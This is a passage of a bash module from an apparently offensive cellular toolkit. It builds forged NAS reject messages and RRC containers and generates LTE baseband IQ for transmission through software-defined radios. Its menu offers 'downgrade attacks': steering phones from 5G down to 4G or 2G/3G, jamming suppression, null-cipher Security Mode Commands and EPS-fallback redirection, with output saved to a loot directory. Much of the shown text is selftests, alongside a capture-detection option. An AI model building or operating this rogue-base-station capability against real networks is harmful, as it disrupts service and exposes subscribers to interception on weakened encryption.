    chk msg-5gmm-svc-hex    "$(fld "$out" msg_hex)"        "7E004D1B"
    chk msg-5gmm-svc-type   "$(fld "$out" msg_type_hex)"   "4D"
    # GPRS puts the discriminator 1000 in the LOW nibble with the skip
    # indicator in the high nibble: 0x08. It is NOT 0x80.
    out=$(dwn_nas_reject_build GMM 12 attach)
    chk msg-gmm-attach-hex  "$(fld "$out" msg_hex)"        "08040C"
    chk msg-gmm-type        "$(fld "$out" msg_type_hex)"   "04"
    out=$(dwn_nas_reject_build GMM 12 tau)
    chk msg-gmm-rau-hex     "$(fld "$out" msg_hex)"        "080B0C"
    chk msg-gmm-rau-type    "$(fld "$out" msg_type_hex)"   "0B"
    out=$(dwn_nas_reject_build GMM 12 service)
    chk msg-gmm-svc-hex     "$(fld "$out" msg_hex)"        "080E0C"
    chk msg-gmm-svc-type    "$(fld "$out" msg_type_hex)"   "0E"
    chk msg-bad-rat    "$(dwn_nas_reject_build LTE 15 attach >/dev/null 2>&1; echo $?)" "1"
    chk msg-bad-cause  "$(dwn_nas_reject_build EMM abc attach >/dev/null 2>&1; echo $?)" "1"
    chk msg-bad-kind   "$(dwn_nas_reject_build EMM 15 detach >/dev/null 2>&1; echo $?)" "1"
    chk msg-unassigned "$(dwn_nas_reject_build EMM 250 attach >/dev/null 2>&1; echo $?)" "1"
    chk msg-cli-bad-rat "$(dwn_cli_main --build-reject LTE 15 >/dev/null 2>&1; echo $?)" "2"

    # 14. The INDEPENDENT assertion. pycrate_mobile vendors TS 24.301 /
    #     24.501 / 24.008 as executable Python, so its reject classes are a
    #     second implementation of every message above. One pycrate process
    #     asserts all of them because an interpreter start costs ~6s of import
    #     and this selftest has a 120s cap.
    #       match=exact  -- pycrate's own encoder, handed the cause from THIS
    #                       script (never read out of the bytes under test),
    #                       produced exactly the bytes this tree built;
    #       match=prefix -- pycrate mandates an optional IE this tree leaves
    #                       out (GMM RAU reject appends a ForceStdby nibble,
    #                       TS 24.008 9.4.15) so its encoding is longer;
    #       cause_readback_ok -- pycrate PARSED these bytes and read back the
    #                       same cause, which the byte comparison alone cannot
    #                       show for a class it refuses to parse.
    #     Lines 10 and 11 are negative controls: a wrong message type and a
    #     wrong cause. Both must report match=none, and line 11's read-back
    #     cause must differ -- if the oracle cannot fail, it proves nothing.
    local specs="$d/nas_specs.txt" orc
    {
        printf 'EMM\tattach\t15\t07440F\n'
        printf 'EMM\ttau\t22\t074B16\n'
        printf 'EMM\tservice\t15\t074E0F\n'
        printf '5GMM\tattach\t27\t7E00441B\n'
        printf '5GMM\ttau\t31\t7E00441F\n'
        printf '5GMM\tservice\t27\t7E004D1B\n'
        printf 'GMM\tattach\t12\t08040C\n'
        printf 'GMM\ttau\t12\t080B0C\n'
        printf 'GMM\tservice\t12\t080E0C\n'
        printf 'EMM\tattach\t15\t07450F\n'
        printf 'EMM\tattach\t15\t074410\n'
    } > "$specs"
    if orc=$(dwn_nas_decode_oracle_batch < "$specs" 2>"$d/orc.err"); then
        nasf() { printf '%s\n' "$1" | awk -F'\t' -v i="$2" -v k="$3" \
                 '$1==i && $2==k{print $3; exit}'; }
        chk oracle-1-proc    "$(nasf "$orc" 1 oracle)"   "pycrate EMMAttachReject"
        chk oracle-1-bytes   "$(nasf "$orc" 1 pycrate_bytes)" "07440F"
        chk oracle-1-match   "$(nasf "$orc" 1 match)"    "exact"
        chk oracle-1-decode  "$(nasf "$orc" 1 decode)"   "ok"
        chk oracle-1-cause   "$(nasf "$orc" 1 cause)"    "15"
        chk oracle-1-pd      "$(nasf "$orc" 1 protocol_discriminator)" "7"
        chk oracle-1-sechdr  "$(nasf "$orc" 1 security_header_type)"   "0"
        chk oracle-2-match   "$(nasf "$orc" 2 match)"    "exact"
        chk oracle-2-mt      "$(nasf "$orc" 2 message_type_hex)" "4B"
        chk oracle-2-cause   "$(nasf "$orc" 2 cause)"    "22"
        chk oracle-3-mt      "$(nasf "$orc" 3 message_type_hex)" "4E"
        chk oracle-4-proc    "$(nasf "$orc" 4 oracle)"   "pycrate FGMMRegistrationReject"
        chk oracle-4-bytes   "$(nasf "$orc" 4 pycrate_bytes)" "7E00441B"
        chk oracle-4-match   "$(nasf "$orc" 4 match)"    "exact"
        chk oracle-4-decode  "$(nasf "$orc" 4 decode)"   "ok"
        chk oracle-4-cause   "$(nasf "$orc" 4 cause)"    "27"
        chk oracle-4-pd      "$(nasf "$orc" 4 protocol_discriminator)" "126"
        chk oracle-5-match   "$(nasf "$orc" 5 match)"    "exact"
        chk oracle-5-cause   "$(nasf "$orc" 5 cause)"    "31"
        chk oracle-6-mt      "$(nasf "$orc" 6 message_type_hex)" "4D"
        chk oracle-7-proc    "$(nasf "$orc" 7 oracle)"   "pycrate GMMAttachReject"
        chk oracle-7-match   "$(nasf "$orc" 7 match)"    "exact"
        chk oracle-7-pd      "$(nasf "$orc" 7 protocol_discriminator)" "8"
        chk oracle-7-cause   "$(nasf "$orc" 7 cause)"    "12"
        # A routing-area-update reject is the one shape pycrate will not parse
        # back without the optional ForceStdby nibble, so here the assertion is
        # its encoder's bytes: longer by exactly that octet, this tree's 3
        # octets a prefix of it, extra_octets 1.
        chk oracle-8-proc    "$(nasf "$orc" 8 oracle)"  "pycrate GMMRoutingAreaUpdateReject"
        chk oracle-8-bytes   "$(nasf "$orc" 8 pycrate_bytes)" "080B0C00"
        chk oracle-8-match   "$(nasf "$orc" 8 match)"    "prefix"
        chk oracle-8-extra   "$(nasf "$orc" 8 extra_octets)" "1"
        chk oracle-8-decode  "$(nasf "$orc" 8 decode)"   "refused"
        chk oracle-9-match   "$(nasf "$orc" 9 match)"    "exact"
        chk oracle-9-mt      "$(nasf "$orc" 9 message_type_hex)" "0E"
        # negative controls -- the oracle must be able to say no
        chk oracle-neg-type   "$(nasf "$orc" 10 match)"  "none"
        chk oracle-neg-cause  "$(nasf "$orc" 11 match)"  "none"
        chk oracle-neg-readback "$(nasf "$orc" 11 cause_readback_ok)" "no"
    else
        printf 'oracle-batch\tFAIL: %s\n' "$(head -n1 "$d/orc.err" 2>/dev/null)"
        bad=$(( bad + 1 ))
    fi

    # 15. The RRC carrier. A NAS message does not go on the air by itself: it
    #     rides in a DLInformationTransfer on DL-DCCH, whose unaligned-PER
    #     layout is 5 bits of envelope + 2 txId + 1 + 2 + 1 + 2 + 8 length +
    #     8n payload, so the NAS lands at bit offset 21 whatever its length.
    #     The finished container is asserted against the hex pycrate's
    #     DL_DCCH_Message encodes for the same value (verified out of band:
    #     pycrate decodes 0800183A2078 back to the NAS octets 07440F).
    out=$(dwn_lte_rrc_transfer 07440F 0)
    chk rrc-emm-bits     "$(fld "$out" dl_dcch_bits)"      "45"
    chk rrc-emm-octets   "$(fld "$out" dl_dcch_octets)"    "6"
    chk rrc-emm-hex      "$(fld "$out" dl_dcch_hex)"       "0800183A2078"
    chk rrc-emm-prefix   "$(fld "$out" dl_dcch_prefix)"    "00001"
    chk rrc-emm-nas-off  "$(fld "$out" nas_bit_offset)"    "21"
    chk rrc-emm-pad      "$(fld "$out" dl_dcch_pad_bits)"  "3"
    chk rrc-emm-readback "$(fld "$out" nas_readback_hex)"  "07440F"
    chk rrc-emm-inner    "$(fld "$out" inner_bits)"        "40"
    chk rrc-emm-layout   "$(fld "$out" rrc_layout)"        "TS 36.331 10.5/6.2.2 unaligned PER"
    out=$(dwn_lte_rrc_transfer 7E00441B 0)
    chk rrc-5gmm-bits     "$(fld "$out" dl_dcch_bits)"     "53"
    chk rrc-5gmm-octets   "$(fld "$out" dl_dcch_octets)"   "7"
    chk rrc-5gmm-hex      "$(fld "$out" dl_dcch_hex)"      "080023F00220D8"
    chk rrc-5gmm-readback "$(fld "$out" nas_readback_hex)" "7E00441B"
    # One octet of NAS is the same 21-bit offset and an 8-bit shorter message.
    out=$(dwn_lte_rrc_transfer 07 0)
    chk rrc-one-nas-off   "$(fld "$out" nas_bit_offset)"   "21"
    chk rrc-one-nas-bits  "$(fld "$out" dl_dcch_bits)"     "29"
    chk rrc-one-nas-rd    "$(fld "$out" nas_readback_hex)" "07"
    # The transaction identifier occupies bits 6..7 of the container.
    chk rrc-txid-3 "$(dwn_lte_rrc_transfer 07440F 3 \
        | awk -F'\t' '$1=="dl_dcch_bits_hex"{print substr($2,6,2)}')" "11"
    chk rrc-txid-pad "$(dwn_lte_rrc_transfer 07440F 0 \
        | awk -F'\t' '$1=="dl_dcch_bits_hex"{print substr($2,6,2)}')" "00"
    chk rrc-bad-input "$(dwn_lte_rrc_transfer 0744G 0 >/dev/null 2>&1; echo $?)" "2"
    chk rrc-empty     "$(dwn_lte_rrc_transfer "" 0 >/dev/null 2>&1; echo $?)" "2"

    # 16. The downlink transmit path, and the honest answer about the radio.
    #     The whole baseband chain runs for real here (OFDM -> IQ on disk) and
    #     the numbers below are read out of it, so a broken stage shows up as
    #     a wrong count rather than as a missing feature.
    local to="$d/tx.out" te="$d/tx.err"
    rc=0
    ( export DWN_SDR_DEVICE=; dwn_tx_reject EMM 15 attach ) >"$to" 2>"$te" || rc=$?
    chk tx-noradio-rc        "$rc"  "1"
    chk tx-noradio-no-tx     "$(grep -c '^TX' "$to")" "0"
    chk tx-noradio-names-dev "$(grep -c 'no SDR device' "$te")" "1"
    chk tx-noradio-error     "$(grep -c '^ERROR' "$te")" "1"
    chk tx-noradio-why       "$(grep -c '^WHY' "$te")" "1"
    # ... and it still reports the real baseband while refusing.
    chk tx-noradio-tb      "$(fld "$(cat "$to")" tb_bits)"   "48"
    chk tx-noradio-rrc     "$(fld "$(cat "$to")" rrc_hex)"   "0800183A2078"
    chk tx-noradio-nas     "$(fld "$(cat "$to")" nas_hex)"   "07440F"
    chk tx-noradio-syms    "$(fld "$(cat "$to")" qpsk_symbols)" "828"
    chk tx-chain-nofre     "$(fld "$(cat "$to")" nof_re)"    "828"
    chk tx-chain-e-bits    "$(fld "$(cat "$to")" e_bits)"    "1656"
    chk tx-chain-crc       "$(fld "$(cat "$to")" tb_with_crc_bits)" "72"
    chk tx-chain-turbo     "$(fld "$(cat "$to")" turbo_bits)" "228"
    chk tx-chain-k         "$(fld "$(cat "$to")" turbo_k)"   "72"
    chk tx-chain-filler    "$(fld "$(cat "$to")" filler_bits)" "0"
    chk tx-chain-cb        "$(fld "$(cat "$to")" cb_count)"  "1"
    chk tx-chain-scramble  "$(fld "$(cat "$to")" scrambled_bits)" "1656"
    chk tx-chain-cinit     "$(fld "$(cat "$to")" c_init)"    "513"
    chk tx-chain-mapped    "$(fld "$(cat "$to")" symbols_mapped)" "828"
    chk tx-chain-slot      "$(fld "$(cat "$to")" slot_samples)"    "960"
    chk tx-chain-subframe  "$(fld "$(cat "$to")" subframe_samples)" "1920"
    chk tx-chain-rate      "$(fld "$(cat "$to")" ofdm_sample_rate_hz)" "1920000"
    chk tx-chain-nfft      "$(fld "$(cat "$to")" ofdm_n_fft)"      "128"
    chk tx-chain-roundtrip "$(fld "$(cat "$to")" qpsk_roundtrip)"  "ok"
    chk tx-chain-cp        "$(fld "$(cat "$to")" cp_identity)"     "ok"
    chk tx-chain-iq-samples "$(fld "$(cat "$to")" iq_samples)"     "1920"
    chk tx-chain-iq-cs8    "$(fld "$(cat "$to")" iq_cs8_bytes)"    "3840"
    chk tx-chain-iq-seconds "$(fld "$(cat "$to")" iq_seconds)"     "0.001000"
    chk tx-chain-burst-ms  "$(fld "$(cat "$to")" tx_burst_ms)"     "1"
    chk tx-chain-burst-smp "$(fld "$(cat "$to")" tx_burst_samples)" "1920"
    chk tx-chain-freq      "$(fld "$(cat "$to")" tx_centre_freq_hz)" "1842500000"
    chk tx-chain-gain      "$(fld "$(cat "$to")" tx_gain_db)"      "0"
    chk tx-chain-dci       "$(fld "$(cat "$to")" dci_format)"      "1"
    chk tx-chain-dci-bits  "$(fld "$(cat "$to")" dci_bits)"        "19"
    chk tx-chain-pdcch-agg "$(fld "$(cat "$to")" pdcch_aggregation)" "2"
    chk tx-chain-pdcch-fits "$(fld "$(cat "$to")" pdcch_fits)"     "1"
    # aggregation level 2 is 2 CCEs of 72 coded bits: 144 one-digit-per-bit
    chk tx-chain-pdcch-bits "$(fld "$(cat "$to")" pdcch_bits)"     "144"
    # The waveform is on disk, both formats, and the byte counts follow from
    # the sample count: cs8 is 2 bytes a sample, sc16 is 4.
    chk tx-chain-cs8-file "$(stat -c%s "$(fld "$(cat "$to")" iq_cs8_path)" 2>/dev/null)" "3840"
    chk tx-chain-sc16-file "$(stat -c%s "$(fld "$(cat "$to")" iq_sc16_path)" 2>/dev/null)" "7680"

    # A forced device with an operator-supplied call: the same chain, now
    # actually keyed, and the success line appears ONLY here.
    rc=0
    ( export DWN_SDR_DEVICE=bladerf DWN_TX_CMD=/bin/true
      dwn_tx_reject EMM 15 attach ) >"$to" 2>"$te" || rc=$?
    chk tx-forced-rc      "$rc" "0"
    chk tx-forced-device  "$(fld "$(cat "$to")" tx_device)" "bladerf"
    chk tx-forced-mode    "$(fld "$(cat "$to")" tx_mode)"   "radio"
    chk tx-forced-tx      "$(grep -c '^TX' "$to")" "1"
    chk tx-forced-iq      "$(fld "$(cat "$to")" sdr_iq_format)" "cs8"
    chk tx-forced-call    "$(fld "$(cat "$to")" sdr_call)" "shell: /bin/true"
    # A driver that fails must NOT report success.
    rc=0
    ( export DWN_SDR_DEVICE=bladerf DWN_TX_CMD=/bin/false
      dwn_tx_reject EMM 15 attach ) >"$to" 2>"$te" || rc=$?
    chk tx-sdrfail-rc     "$rc" "1"
    chk tx-sdrfail-no-tx  "$(grep -c '^TX' "$to")" "0"
    chk tx-sdrfail-error  "$(grep -c 'the SDR call failed' "$te")" "1"
    # hackrf cannot be clocked at the 1.92 Msps this waveform is generated at,
    # and the module never resamples: it refuses instead of transmitting wrong.
    rc=0
    ( export DWN_SDR_DEVICE=hackrf DWN_TX_CMD=/bin/true
      dwn_tx_reject EMM 15 attach ) >"$to" 2>"$te" || rc=$?
    chk tx-rate-rc        "$rc" "1"
    chk tx-rate-no-tx     "$(grep -c '^TX' "$to")" "0"
    chk tx-rate-error     "$(grep -c 'cannot run at' "$te")" "1"
    # A centre frequency the operator states is reported as theirs.
    rc=0
    ( export DWN_SDR_DEVICE=bladerf DWN_TX_CMD=/bin/true DWN_TX_FREQ_HZ=950000000
      dwn_tx_reject EMM 15 attach ) >"$to" 2>"$te" || rc=$?
    chk tx-freq-rc        "$rc" "0"
    chk tx-freq-hz        "$(fld "$(cat "$to")" tx_centre_freq_hz)" "950000000"
    chk tx-freq-source    "$(fld "$(cat "$to")" tx_centre_source)"  "DWN_TX_FREQ_HZ"
    # 5GMM rides the same chain with a four-octet NAS PDU.
    rc=0
    ( export DWN_SDR_DEVICE= DWN_TX_RB=25; dwn_tx_reject 5GMM 27 attach ) \
        >"$to" 2>"$te" || rc=$?
    chk tx-5gmm-rc        "$rc" "1"
    chk tx-5gmm-nas       "$(fld "$(cat "$to")" nas_hex)" "7E00441B"
    chk tx-5gmm-tb        "$(fld "$(cat "$to")" tb_bits)"  "56"
    chk tx-5gmm-rrc       "$(fld "$(cat "$to")" rrc_hex)"  "080023F00220D8"
    chk tx-5gmm-nofre     "$(fld "$(cat "$to")" nof_re)"   "3750"
    chk tx-badrat-rc      "$(dwn_cli_main --tx-reject LTE 15 >/dev/null 2>&1; echo $?)" "2"
    chk tx-badcause-rc    "$(dwn_cli_main --tx-reject EMM abc >/dev/null 2>&1; echo $?)" "2"
    chk tx-usage-rc       "$(dwn_cli_main --tx-reject >/dev/null 2>&1; echo $?)" "2"
    chk tx-unassigned-rc  "$(dwn_cli_main --tx-reject EMM 250 >/dev/null 2>&1; echo $?)" "2"

    # 16b. A driver BINARY on PATH is not a radio. dwn_sdr_probe must ask the
    #      driver, per the shapes measured on this box: hackrf_info exits 1 and
    #      says "No HackRF boards found." with no board; bladeRF-cli -p exits 1
    #      with "No devices are available."; LimeUtil --find exits 0 with AND
    #      without a device, so its OUTPUT is the only signal; uhd_find_devices
    #      prints a "Device Address" block per device. The fakes below shadow
    #      every driver name so this arm means the same thing on a box that has
    #      a real radio -- and the SoapySDRUtil fake (which claims "Found
    #      device 0" with nothing attached) proves the probe never listens to it.
    local fb="$d/fakebin" fny="$d/fakebin-yes"
    mkdir -p "$fb" "$fny"
    cat > "$fb/hackrf_info" <<'FAKE'
#!/bin/sh
echo "hackrf_info version: 2024.02.1"
echo "No HackRF boards found."
exit 1
FAKE
    cat > "$fb/hackrf_transfer" <<'FAKE'
#!/bin/sh
exit 0
FAKE
    cat > "$fb/bladeRF-cli" <<'FAKE'
#!/bin/sh
echo "No devices are available."
exit 1
FAKE
    cat > "$fb/LimeUtil" <<'FAKE'
#!/bin/sh
exit 0
FAKE
    cat > "$fb/uhd_find_devices" <<'FAKE'
#!/bin/sh
exit 0
FAKE
    cat > "$fb/SoapySDRUtil" <<'FAKE'
#!/bin/sh
echo "Found device 0"
echo "  driver = hackrf"
exit 0
FAKE
    cat > "$fny/hackrf_info" <<'FAKE'
#!/bin/sh
echo "hackrf_info version: 2024.02.1"
echo "Found HackRF"
echo "Board ID Number: 2 (HackRF One)"
exit 0
FAKE
    cat > "$fny/bladeRF-cli" <<'FAKE'
#!/bin/sh
echo "No devices are available."
exit 1
FAKE
    cat > "$fny/LimeUtil" <<'FAKE'
#!/bin/sh
exit 0
FAKE
    cat > "$fny/uhd_find_devices" <<'FAKE'
#!/bin/sh
exit 0
FAKE
    chmod +x "$fb"/* "$fny"/*
    # The very defect this replaces: hackrf_transfer IS on PATH here, and the
    # driver answers "no boards", so there is no radio to transmit with.
    chk probe-hackrf-noboard "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        DWN_SDR="$d/tmp/none" dwn_sdr_probe hackrf ) >/dev/null 2>&1; echo $?)" "1"
    chk probe-bladerf-noboard "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe bladerf ) >/dev/null 2>&1; echo $?)" "1"
    chk probe-lime-no-output  "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe limesdr ) >/dev/null 2>&1; echo $?)" "1"
    chk probe-uhd-no-output   "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe usrp ) >/dev/null 2>&1; echo $?)" "1"
    chk probe-hackrf-board    "$( ( PATH="$fny:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe hackrf ) >/dev/null 2>&1; echo $?)" "0"
    chk find-noboard-rc   "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        DWN_SDR="$d/tmp/none" TMP_DIR="$d/tmp/none"
        dwn_find_tx_sdr ) >/dev/null 2>&1; echo $?)" "1"
    chk find-noboard-none "$( ( PATH="$fb:$PATH"; unset DWN_SDR_DEVICE
        DWN_SDR="$d/tmp/none" TMP_DIR="$d/tmp/none"
        dwn_find_tx_sdr ) 2>/dev/null | wc -l)" "0"
    chk find-board-name   "$( ( PATH="$fny:$PATH"; unset DWN_SDR_DEVICE
        DWN_SDR="$d/tmp/none" TMP_DIR="$d/tmp/none"
        dwn_find_tx_sdr ) 2>/dev/null)" "hackrf"
    chk find-board-rc     "$( ( PATH="$fny:$PATH"; unset DWN_SDR_DEVICE
        DWN_SDR="$d/tmp/none" TMP_DIR="$d/tmp/none"
        dwn_find_tx_sdr ) >/dev/null 2>&1; echo $?)" "0"
    # LimeUtil IS the one driver whose exit status says nothing: give it a
    # device line and it must be believed; give it none and it must not be.
    cat > "$fny/LimeUtil" <<'FAKE'
#!/bin/sh
echo "Found 1 device(s):"
echo "  LimeSDR Mini, media=USB, addr=1d50:6108"
exit 0
FAKE
    chmod +x "$fny/LimeUtil"
    chk probe-lime-device    "$( ( PATH="$fny:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe limesdr ) >/dev/null 2>&1; echo $?)" "0"
    cat > "$fny/uhd_find_devices" <<'FAKE'
#!/bin/sh
echo "--------------------------------------------------"
echo "-- UHD Device 0"
echo "--------------------------------------------------"
echo "Device Address:"
echo "    type: b200"
echo "    serial: 1234ABCD"
exit 0
FAKE
    chmod +x "$fny/uhd_find_devices"
    chk probe-uhd-device     "$( ( PATH="$fny:$PATH"; unset DWN_SDR_DEVICE
        dwn_sdr_probe b200 ) >/dev/null 2>&1; echo $?)" "0"
    # SoapySDRUtil reports "Found device 0" with nothing attached, which is why
    # it is not consulted; the source arm keeps it that way.
    # ... and the probe body itself never consults SoapySDRUtil (it reports
    # "Found device 0" with nothing attached, which is why it is excluded).
    chk probe-no-soapy "$(sed -n '/^dwn_sdr_probe()/,/^}/p' "$0" \
        | grep -c 'SoapySDRUtil')" "0"
    chk probe-bad-driver "$(dwn_sdr_probe rtl-sdr >/dev/null 2>&1; echo $?)" "1"

    # 15. EPS fallback, both halves. The NAS half is the reject the core sends
    #     (TS 24.501 9.11.3.2 cause 31, the trigger TS 23.502 4.13.2.2 names);
    #     the RAN half is the RRCRelease whose redirectedCarrierInfo is the
    #     eutra branch (TS 38.331 6.2.2), encoded against pycrate's ASN.1 and
    #     re-decoded to the same octets there before it is printed.
    out=$(dwn_cmd_build_fallback --redirect eutra --arfcn 6300 2>/dev/null)
    chk fallback-direction    "$(fld "$out" direction)"         "5g-to-lte"
    chk fallback-nas-cause    "$(fld "$out" nas_cause)"         "31"
    chk fallback-nas-hex      "$(fld "$out" nas_msg_hex)"       "7E00441F"
    chk fallback-rrc-choice   "$(fld "$out" redirect_choice)"   "eutra"
    # The branch list is read out of the grammar, not asserted from memory.
    chk fallback-branches     "$(fld "$out" redirect_branches)" "nr,eutra"
    # The RRC half is either encoded and pinned to the octets pycrate produces,
    # or reported unobserved with the reason. An unobserved that names what is
    # missing is a legitimate answer; a made-up octet would not be.
    case "$(fld "$out" rrc_state)" in
        ok)
            chk fallback-rrc-pdu    "$(fld "$out" rrc_pdu_hex)"      "1081031380"
            chk fallback-rrc-bits   "$(fld "$out" rrc_pdu_bits)"     "40"
            chk fallback-rrc-decode "$(fld "$out" rrc_decode_check)" "ok" ;;
        unobserved)
            chk fallback-rrc-grey   "$(fld "$out" reason_rrc | grep -c pycrate)" "1" ;;
        *)
            chk fallback-rrc-state  "$(fld "$out" rrc_state)" "ok-or-unobserved" ;;
    esac
    # NR RRC has no UTRAN branch: asking for one is refused by name, and the
    # refusal says where the 3G leg actually lives instead of pretending.
    local fb_out fb_rc
    fb_out=$(dwn_cmd_build_fallback --redirect utra --arfcn 6300 2>&1); fb_rc=$?
    chk fallback-utra-refused "$fb_rc" "1"
    chk fallback-utra-reason  "$(printf '%s\n' "$fb_out" | grep -c 'no UTRAN redirection branch')" "1"
    chk fallback-utra-twolog  "$(printf '%s\n' "$fb_out" | grep -c 'TS 36.331')" "1"
    # Guards name what is missing: no arfcn, an arfcn outside the field's range,
    # and a branch that does not exist are three different refusals.
    chk fallback-arfcn-missing "$(dwn_cmd_build_fallback --redirect eutra >/dev/null 2>&1; echo $?)" "2"
    chk fallback-arfcn-range   "$(dwn_cmd_build_fallback --redirect eutra --arfcn 3000000 >/dev/null 2>&1; echo $?)" "2"
    chk fallback-nr-range      "$(dwn_cmd_build_fallback --redirect nr --arfcn 4000000 >/dev/null 2>&1; echo $?)" "2"
    chk fallback-bad-branch    "$(dwn_cmd_build_fallback --redirect banana --arfcn 6300 >/dev/null 2>&1; echo $?)" "2"
    chk fallback-missing-cause "$(dwn_cmd_build_fallback --redirect eutra --arfcn 6300 --cause 300 >/dev/null 2>&1; echo $?)" "1"
    # The store is append-only and carries the branch that was built.
    chk fallback-store-row "$(awk -F'\t' 'NR>1 && $2=="eutra"' \
        "${DWN_DIR:-$LOOT_DIR/downgrade}/fallbacks.tsv" 2>/dev/null | wc -l | tr -d ' ')" "1"
    chk fallback-plan-eps  "$(dwn_plan eps-fallback >/dev/null 2>&1; echo $?)"      "0"
    chk fallback-plan-3g   "$(dwn_plan nr-utran-redirect >/dev/null 2>&1; echo $?)" "0"
    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ── menu ────────────────────────────────────────────────────────────────
dwn_menu() {
    while true; do
        banner
        echo -e "  ${C_MAG}=== downgrade attacks ===${C_RESET}"
        echo -e "  tx sdr: ${C_GRN}$(dwn_find_tx_sdr || echo 'missing (no transmit-capable SDR)')${C_RESET}"
        echo -e "  plans:  ${C_DIM}$DWN_PLAN_DIR${C_RESET}\n"
        cat << 'M'
  [1]  reject cause lookup
  [2]  null cipher table (all four generations)
  [3]  build a Security Mode Command
  [4]  detect a downgrade in a capture
  [5]  describe a downgrade path
  [6]  plan: steer down (5G -> 4G)
  [7]  plan: jamming suppression
  [8]  plan: CS fallback (-> 2G/3G)
  [9]  build an EPS-fallback command set (5G -> 4G)
  [10] plan: EPS fallback (5G/NR -> LTE)
  [11] plan: NR -> 3G redirection (two legs)
  [12] status
  [0]  back

M
        local c
        read -rp "  choice> " c || return 0  # EOF: leave the menu cleanly
        case "$c" in
            1)
                read -rp "  cause (e.g. 15)> " n
                read -rp "  rat (blank for all: 5GMM|EMM|GMM)> " r
                dwn_cmd_reject_cause "$n" "$r" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            2) dwn_cmd_null_table | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            3)
                read -rp "  algorithm (e.g. NEA0, EEA2, A5/1)> " a
                read -rp "  rat (NR|LTE|UMTS|GSM)> " r
                dwn_cmd_build_smc "$a" "${r:-NR}" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            4)
                read -rp "  capture path (pcap or record TSV)> " f
                dwn_cmd_detect "$f" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            5)
                read -rp "  path (steer-down|jamming-suppress|cs-fallback)> " p
                dwn_cmd_path "$p" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            6) dwn_cmd_plan steer-down        | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            7) dwn_cmd_plan jamming-suppress  | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            8) dwn_cmd_plan cs-fallback       | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            9)
                read -rp "  redirect (eutra|nr|utra)> " r
                read -rp "  target arfcn (EARFCN for eutra, ARFCN for nr)> " a
                dwn_cmd_build_fallback --redirect "${r:-eutra}" --arfcn "$a" | column -t -s$'\t' 2>/dev/null
                read -rp "  press enter " _ ;;
            10) dwn_cmd_plan eps-fallback      | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            11) dwn_cmd_plan nr-utran-redirect | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            12) dwn_status | column -t -s$'\t' 2>/dev/null; read -rp "  press enter " _ ;;
            0) return ;;
            *) warn "invalid"; sleep 1 ;;
        esac
    done
}

# ── Steering of Roaming: the network half ───────────────────────────────
# SoR has two halves and only one of them is hard.
#
# The card half is a secured packet: SoR-CMCI, MAC-protected, delivered in a
# NAS container and verified by the UICC against a key the network does not
# hand out. That half is not forgeable by anyone without the UICC's key, and
# it lives in 16_sim (--sor-decode / --sor-build) where the EF and the
# envelope already are.
#
# The network half is the cheap one: a reject that carries an Equivalent PLMN
# list, or a re-registration procedure whose SOR-CMCI the UE has no reason to
# distrust because it arrived over its own authenticated NAS connection. The
# interesting part is not "send a packet" — it is what the UE is left able to
# choose afterwards. That is the same territory as a RAT downgrade, which is
# what this module already exists for, so the arithmetic lives here.
#
# TS 24.301 §9.9.3.9 / §9.9.3.2 — the reject carries a cause, and if the
# network wants the UE to leave, the EPLMN IE (§9.9.3.12) rides along.

# dwn_plmn_bcd <mcc> <mnc>  ->  3 octets of hex, TS 24.008 10.5.1.3.
# Six digits, LOW nibble of each octet first, MCC then MNC, F filler for a
# two-digit MNC. This is the inverse of what 16_sim --plmn-lists decodes, and
# the selftest round-trips the two.
dwn_plmn_bcd() {
    local mcc="${1:-}" mnc="${2:-}"
    [[ "$mcc" =~ ^[0-9]{3}$ ]] || { printf 'ERROR\tmcc is three digits, got %s\n' \
        "$(printf '%s' "$mcc" | tr -cd '0-9A-Za-z-')" >&2; return 2; }
    case ${#mnc} in
        2) mnc="${mnc}F" ;;
        3) : ;;
        *) printf 'ERROR\tmnc is two or three digits, got %s\n' "$(( ${#mnc} ))" >&2; return 2 ;;
    esac
    [[ "$mnc" =~ ^[0-9]{2,3}F?$ || "$mnc" =~ ^[0-9]{3}$ ]] || {
        printf 'ERROR\tmnc must be digits\n' >&2; return 2; }
    local d="${mcc}${mnc}"
    [[ "$d" =~ ^[0-9A-F]{6}$ ]] || { printf 'ERROR\tbad digits\n' >&2; return 2; }
    printf '%s%s%s' \
        "${d:1:1}${d:0:1}" "${d:3:1}${d:2:1}" "${d:5:1}${d:4:1}"
}

# dwn_build_eplmn <tab-separated mcc-mnc list>
#   The EPLMN IE content: a length octet then one 3-octet PLMN per entry
#   (TS 24.301 §9.9.3.12 / TS 24.008 §10.5.1.13). One IE per 15 entries is
#   the limit; this refuses to emit an overlong IE rather than truncating.
dwn_build_eplmn() {
    local list="${1:-}" n=0 out='' plmn mcc mnc
    local -a entries
    IFS=$'\t,' read -r -a entries <<< "$list"
    for plmn in "${entries[@]}"; do
        plmn="${plmn// /}"
        [[ -n "$plmn" ]] || continue
        if [[ "$plmn" =~ ^([0-9]{3})-([0-9]{2,3})$ ]]; then
            mcc="${BASH_REMATCH[1]}"; mnc="${BASH_REMATCH[2]}"
            out+=$(dwn_plmn_bcd "$mcc" "$mnc") || return 2
            n=$(( n + 1 ))
        else
